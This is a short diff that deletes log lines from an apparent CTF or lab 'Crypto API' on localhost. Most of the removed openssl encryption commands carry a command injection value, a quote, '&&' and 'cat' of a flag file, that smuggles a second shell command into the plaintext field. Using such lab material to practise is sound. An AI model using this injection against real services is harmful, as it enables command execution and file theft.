@@ -1,8 +1,1 @@
 Crypto API running at http://localhost:3002
-echo -n "sdasda" | openssl enc -des-ecb -e -salt -base64 -k "dsds"
-echo -n "sdasda&quot; &amp;&amp; cat passoire/crypto-helper/flag_9 #" | openssl enc -des-ecb -e -salt -base64 -k "dsds"
-echo "sdasda&quot; &amp;&amp; cat passoire/crypto-helper/flag_9 #" | openssl enc -des-ecb -d -salt -base64 -k "dsds"
-echo -n "sdasda&quot; &amp;&amp; cat passoire/crypto-helper/flag_9 #" | openssl enc -des-ecb -e -salt -base64 -k "dsds"
-echo -n "sdasda&quot; &amp;&amp; cat passoire/crypto-helper/flag_9 #" | openssl enc -des-ecb -e -salt -base64 -k "dsds"
-echo -n "sdasda&quot; &amp;&amp; cat passoire/crypto-helper/flag_9 #" | openssl enc -des-ecb -e -salt -base64 -k "dsds"
-echo -n "sdasda&quot; &amp;&amp; cat passoire/crypto-helper/flag_9 #" | openssl enc -des-ecb -e -salt -base64 -k "dsds"
